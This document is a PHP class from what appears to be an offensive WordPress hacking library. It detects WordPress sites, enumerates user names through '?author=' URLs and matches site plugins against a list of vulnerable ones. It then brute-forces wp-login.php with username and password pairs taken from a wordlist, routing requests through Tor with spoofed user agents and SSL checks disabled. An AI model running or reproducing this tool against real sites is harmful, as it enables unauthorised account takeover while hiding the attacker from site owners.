<?php

namespace Aszone\Component\SearchHacking\Lib\WordPress;

use GuzzleHttp\Client;
use Respect\Validation\Validator as v;
use Symfony\Component\DomCrawler\Crawler;
use Aszone\Component\SearchHacking\Lib\FakeHeaders\FakeHeaders;

//use Aszone\Site;

class WordPress
{
    public $target;

    public $proxy;

    public $portProxy;

    public $tor;

    public $pathPluginJson;

    public $torForGuzzle;

    /**
     * @param string $proxy
     */
    public function setProxy($proxy)
    {
        $this->proxy = $proxy;
    }

    /**
     * @param string $portProxy
     */
    public function setPortProxy($portProxy)
    {
        $this->portProxy = $portProxy;
    }

    /**
     * @param string $tor
     */
    public function setTor($tor = '127.0.0.1:9050')
    {
        $this->tor = $tor;
        $this->torForGuzzle = ['proxy' => [
            'http' => 'socks5://127.0.0.1:9050',
            'https' => 'socks5://127.0.0.1:9050',
        ]];
    }

    public function __construct($target)
    {
        $this->optionTor = array();
        $this->target = $target;
        $this->installPlugin();
    }

    //VERIFY IF IS WORDPRESS
    public function isWordPress()
    {
        $isUrl = v::url()->notEmpty()->validate($this->target);
        if ($isUrl) {
            $baseUrlWordPress = $this->getBaseUrlWordPressCrawler();
            if ($baseUrlWordPress) {
                return true;
            }

            return false;
        }
    }

    public function getBaseUrlWordPressByUrl()
    {
        $validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins|wp-content\/uploads)|xmlrpc.php|feed\/|comments\/feed\/|wp-login.php|wp-admin).*/", $this->target, $m, PREG_OFFSET_CAPTURE);

        if ($validXmlrpc) {
            return $m[1][0];
        } else {
            $header = new FakeHeaders();
            try {
                $client = new Client(['defaults' => [
                    'headers' => ['User-Agent' => $header->getUserAgent()],
                    'proxy' => $this->torForGuzzle,
                    'timeout' => 30,
                ],
                ]);
                $body = $client->get($this->target)->getBody()->getContents();
                $crawler = new Crawler($body);
                $arrLinks = $crawler->filter('script');
                foreach ($arrLinks as $keyLink => $valueLink) {
                    $validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins|wp-content\/uploads)|xmlrpc.php|feed\/|comments\/feed\/|wp-login.php|wp-admin).*/", substr($valueLink->getAttribute('src'), 0), $m, PREG_OFFSET_CAPTURE);
                    if ($validXmlrpc) {
                        return $m[1][0];
                    }
                }
            } catch (\Exception $e) {
                return false;
            }
        }

        return false;
    }

    /*public function getBaseUrlWordPressByUrl(){

        $isUrl   	= v::url()->notEmpty()->validate($this->target);
        $header=new FakeHeaders();

        if($isUrl) {
            $client 	= new Client(['defaults' => [
                'headers' => ['User-Agent' => $header->getUserAgent()],
                'proxy'   => $this->torForGuzzle,
                'timeout' => 30
                ]
            ]);
            $body 		= $client->get( $this->target)->getBody()->getContents();

            //Check status block
            $crawler 	= new Crawler($body);
            $arrLinks 	= $crawler->filter('link');
            var_dump($arrLinks);
            exit();
            foreach ($arrLinks as $keyLink => $valueLink) {
                $validHref=$valueLink->getAttribute('href');
                if (!empty($validHref)) {
                    $validXmlrpc = preg_match("/(.+?)((wp-content\/themes|wp-content\/plugins)|xmlrpc.php|feed\/|comments\/feed\/).*//*", substr($valueLink->getAttribute('href'), 0), $matches, PREG_OFFSET_CAPTURE);
                    if ($validXmlrpc) {
                        $resultTeste=explode($matches[1][0],$this->target);
                        if(count($resultTeste)>=2){
                            return $matches[1][0];
                        }
                    }

                }
            }
        }
    }*/

    public function getBaseUrlWordPressCrawler()
    {
        $targetTests[0] = $this->getBaseUrlWordPressByUrl();
        $targetTests[1] = $targetTests[0].'wp-login.php';
        $header = new FakeHeaders();

        foreach ($targetTests as $keyTarget => $targetTest) {
            try {
                $client = new Client(['defaults' => [
                    'headers' => ['User-Agent' => $header->getUserAgent()],
                    'proxy' => $this->torForGuzzle,
                    'timeout' => 30,
                ],
                ]);
                $res = $client->get($targetTest);
                //Check status block
                $body = $res->getBody()->getContents();
                $crawler = new Crawler($body);

                $arrLinks = $crawler->filter('script');

                foreach ($arrLinks as $keyLink => $valueLink) {
                    $validHref = $valueLink->getAttribute('src');
                    if (!empty($validHref)) {
                        $validXmlrpc = preg_match("/(.+?)(wp-content\/themes|wp-content\/plugins|wp-includes\/).*/", $validHref, $matches, PREG_OFFSET_CAPTURE);

                        if ($validXmlrpc) {
                            return $matches[1][0];
                        }
                    }
                }
            } catch (\Exception $e) {
                //echo "Error code ".$e->getCode()." => ".$e->getMessage();

                    return false;
            }
        }
    }
    public function checkBlockedTime($html)
    {
        $pos3 = strpos($html, 'Account blocked for');
        if ($pos3) {
            $validResult = preg_match("/<span id=\"secondsleft\">(.*)<\/span>/", $html, $m, PREG_OFFSET_CAPTURE);
            if ($validResult) {
                return $m[1][0];
            }
        }

        return false;
    }

    public function validateLogon($html)
    {
        $pos = strpos($html['body'], '<strong>ERRO</strong>');
        $pos2 = strpos($html['body'], '<strong>ERROR</strong>');
        $pos3 = strpos($html['body'], 'Account blocked for');
        $pos4 = strpos($html['status']['url'], 'wp-admin');

        //in future check timeout
        if (($pos !== false or $pos2 !== false or $pos3 !== false)) {
            return false;
        }
        if ($pos4 === false) {
            return false;
        }

        return true;
    }

    public function getRootUrl()
    {
    }

    public function getUsers($limitNumberUsers = 99999)
    {
        $baseUrlWordPress = $this->getBaseUrlWordPressByUrl($this->target);

        $userList = array();
        //Number for validade finish list of user
        $emptySequenceUsers = 0;
        $header = new FakeHeaders();
        for ($i = 1; $i <= $limitNumberUsers; ++$i) {
            try {
                $client = new Client(['defaults' => [
                    'headers' => ['User-Agent' => $header->getUserAgent()],
                    'proxy' => $this->torForGuzzle,
                    'timeout' => 30,
                    ],
                ]);
                $result = $client->get($baseUrlWordPress.'/?author='.$i);

                //Check status block
                $validGetUserByUrl = preg_match("/(.+?)\/\?author=".$i.'/', substr($result->getEffectiveUrl(), 0), $matches, PREG_OFFSET_CAPTURE);

                if (!$validGetUserByUrl) {
                    $username = $this->getUserByUrl($result->getEffectiveUrl());
                } else {
                    $username = $this->getUserBytagBody($result->getBody()->getContents());
                }
                if (!empty($username)) {
                    $userList[] = str_replace('-', ' ', $username);
                    echo $username;
                    echo ' | ';
                    $emptySequenceUsers = 0;
                } else {
                    if ($limitNumberUsers == 99999) {
                        ++$emptySequenceUsers;
                        echo ' | Sequence empty ';
                        if ($emptySequenceUsers == 10) {
                            return $userList;
                        }
                    }
                }
            } catch (\Exception $e) {
                if ($limitNumberUsers == 99999) {
                    ++$emptySequenceUsers;
                    echo ' | Sequence empty ';
                    if ($emptySequenceUsers == 10) {
                        return $userList;
                    }
                }
            }
        }

        return $userList;
    }

    protected function getUserBytagBody($body)
    {
        $crawler = new Crawler($body);
        $bodys = $crawler->filter('body');
        foreach ($bodys as $keyBody => $valueBody) {
            $class = $valueBody->getAttribute('class');
        }
        $username = preg_match("/author-(.+?)\s/", substr($class, 0), $matches, PREG_OFFSET_CAPTURE);
        if (isset($matches[1][0]) and (!empty($matches[1][0]))) {
            return $matches[1][0];
        }

        return false;
    }

    protected function getUserByUrl($urlUser)
    {
        $validUser = preg_match("/author\/([\d\w-@\.%]+)/", substr($urlUser, 0), $matches, PREG_OFFSET_CAPTURE);

        if (isset($matches[1][0]) and (!empty($matches[1][0]))) {
            return $matches[1][0];
        }

        return false;
    }

    public function getPlugins()
    {
    }

    public function getPluginsVullExpert()
    {
        $jsonPlugins = $this->getListPluginsVull();
        //verify if plugins in list of vull
        foreach ($jsonPlugins as $keyPlugin => $plugin) {
            $validPlugin = $this->checkPluginExpert($keyPlugin);
            echo $keyPlugin.' | ';
            if ($validPlugin) {
                $arrPlugin[$keyPlugin] = $plugin;
                $arrPlugin[$keyPlugin]['url'] = $this->target.'/wp-content/plugins/'.$keyPlugin;
            }
        }
        //Verify W3 total cache and Wp Super cache using detectable active because wpscan has
        // unsing guzzle
        // example http://exempla.com/wp-content/plugins/wp-super-cache/
        return $arrPlugin;
    }

    public function getPluginsVull()
    {
        try {
            $arrPluginsVull = array();
            $client = new Client();
            $res = $client->get($this->target, $this->optionTor);
            //check if is block
            $body = $res->getBody()->getContents();
            $crawler = new Crawler($body);
            $arrLinksLink = $crawler->filter('link');
            $arrLinksScript = $crawler->filter('script');

            //find href on links of css
            foreach ($arrLinksLink as $keyLink => $valueLink) {
                if (!empty($valueLink->getAttribute('href'))) {
                    $arryUrls[] = $valueLink->getAttribute('href');
                }
            }

            //find src on scripts of js
            foreach ($arrLinksScript as $keyScript => $valueScript) {
                if (!empty($valueScript->getAttribute('src'))) {
                    $arryUrls[] = $valueScript->getAttribute('src');
                }
            }

            //extract only name of plugin
            $arrPlugins = array();
            foreach ($arryUrls as $urls) {
                $validUrlPlugins = preg_match("/\/wp-content\/plugins\/(.+?)\//", substr($urls, 0), $matches, PREG_OFFSET_CAPTURE);
                if ($validUrlPlugins) {
                    $arrPlugins[] = $matches[1][0];
                }
            }

            //clean plugin repated
            $arrPlugins = array_unique($arrPlugins);

            //return listOfPluginsVull
            $jsonPlugins = $this->getListPluginsVull();

            //Equals list of site with list of all plugins vull
            foreach ($arrPlugins as $plugin) {
                if (array_key_exists($plugin, $jsonPlugins)) {
                    $arrPluginsVull[$plugin] = $jsonPlugins[$plugin];
                }
            }
        } catch (\Exception $e) {
            $arrPluginsVull = array();
        }

        return $arrPluginsVull;
    }

    public function getThemes()
    {
    }

    private function checkPluginExpert($plugin)
    {
        try {
            $url = $this->target.'/wp-content/plugins/'.$plugin;
            $client = new Client();
            $res = $client->get($url, $this->optionTor);
            //check if change new tor ip
            $status = $res->getStatusCode();
            if (!$status == 200) {
                return false;
            }

            return true;
        } catch (\Exception $e) {
            return false;
        }
    }

    private function installPlugin()
    {
        $pathDataZip = __DIR__.'/resource/data.zip';
        $pathFolderTmp = __DIR__.'/resource/tmp/';
        $this->pathPluginJson = __DIR__.'/resource/tmp/data/plugins.json';
        if (!file_exists($this->pathPluginJson)) {
            $zip = new \ZipArchive();
            $zip->open($pathDataZip);
            $zip->extractTo($pathFolderTmp);
            $zip->close();
        }
    }

    private function getListPluginsVull()
    {
        $htmlPlugin = file_get_contents($this->pathPluginJson);
        $jsonPlugins = json_decode($htmlPlugin, true);
        ksort($jsonPlugins);

        return $jsonPlugins;
    }
    private function isHttps($url)
    {
        $isValidate = preg_match("/^https:\/\//", $url, $m, PREG_OFFSET_CAPTURE);
        if ($isValidate) {
            return $isValidate;
        }

        return;
    }
    public function sendDataToLoginWordPress($username, $password, $target)
    {
        try {
            $cookie = 'cookie.txt';

            $postdata = 'log='.$username.'&pwd='.$password.'&wp-submit=Log%20In&redirect_to='.$target.'wp-admin/&testcookie=1';
            $ch = \curl_init();
            $header = new FakeHeaders();
            if ($this->isHttps($target)) {
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            }
            curl_setopt($ch, CURLOPT_URL, $target.'wp-login.php');
            curl_setopt($ch, CURLOPT_USERAGENT, $header->getUserAgent()['User-Agent']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
            curl_setopt($ch, CURLOPT_REFERER, $target.'wp-admin/');
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);

            if (!empty($this->tor)) {
                curl_setopt($ch, CURLOPT_PROXY, $this->tor);
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_VERBOSE, 0);
            }

            $result['body'] = curl_exec($ch);
            $result['status'] = curl_getinfo($ch);

            curl_close($ch);

            //Check if only login is https, if is https return method with target correcty
            if ($this->isHttps($result['status']['url']) and is_null($this->isHttps($target))) {
                $this->target = $result['status']['url'];
                $baseUrlHttps = $this->getBaseUrlWordPressByUrl($result['status']['url']);
                $result = $this->sendDataToLoginWordPress($username, $password, $baseUrlHttps);
            }

            return $result;
        } catch (\Exception $e) {
            echo $e->getMessage();
            $result['body'] = $e->getMessage();
            $result['status'] = $e->getCode();
            exit();
        }

        return $result;
    }
    public function getWordListInArray($wordlist = '')
    {
        if (empty($wordlist)) {

            $wordlist = __DIR__.'/resource/litleWordListPt.txt';
            $arrWordlist = file($wordlist, FILE_IGNORE_NEW_LINES);
            return $arrWordlist;
        }

        $checkFileWordList = v::file()->notEmpty()->validate($wordlist);
        if ($checkFileWordList) {
            $targetResult = file($wordlist, FILE_IGNORE_NEW_LINES);

            return $targetResult;
        }

        return false;
    }
}
